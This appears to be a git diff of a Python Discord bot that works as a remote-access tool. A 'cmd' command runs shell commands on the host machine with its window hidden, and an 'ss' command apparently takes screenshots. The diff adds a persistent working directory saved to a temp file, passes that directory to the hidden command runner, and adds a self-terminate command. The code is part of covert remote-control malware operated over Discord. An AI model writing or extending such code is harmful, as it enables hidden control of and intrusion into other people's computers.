@@ -116,6 +116,7 @@ existing_session_name = exists(TEMP_DIR)
 @bot.event
 async def on_ready():
     global session_name
+    global PWD
     print(f'Logged in as {bot.user}!')
     
     guild = bot.get_guild(SERVER_ID)
@@ -143,6 +144,9 @@ async def on_ready():
                     break
     # shutil.move('libopus-0.dll', os.path.join(TEMP_DIR, 'libopus-0.dll'))
     discord.opus.load_opus(os.path.join(CURRENT_DIRECTORY, 'libopus-0.x64.dll'))
+    if os.path.isfile(os.path.join(TEMP_DIR, "pwd.txt")):
+        with open(os.path.join(TEMP_DIR, "pwd.txt") , 'r' ) as f:
+            PWD = f.read()
 
 
 @bot.command(name='ss')
@@ -303,6 +307,7 @@ async def cmd(ctx,timeout=10, *args):
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 creationflags=subprocess.CREATE_NO_WINDOW,
+                cwd=PWD,
                 shell=True,  # Use shell=True for commands like 'dir', 'echo', etc.
                 timeout=timeout
             )
@@ -319,6 +324,13 @@ async def cmd(ctx,timeout=10, *args):
         await ctx.send(f"`Error has occuried: {e}`")
 @bot.command(name='cd')
 async def cd(ctx, name):
+    global PWD
     PWD = os.path.join(PWD, name)
+    with open(os.path.join(TEMP_DIR, "pwd.txt") ,'w') as f:
+        f.write(PWD)
     await ctx.send(f"`Directory changed:{PWD}`")
+@bot.command(name='kms')
+async def kms(ctx):
+    await ctx.send("`bruu why would u kill meee???? >:( `")
+    exit()
 bot.run(TOKEN)
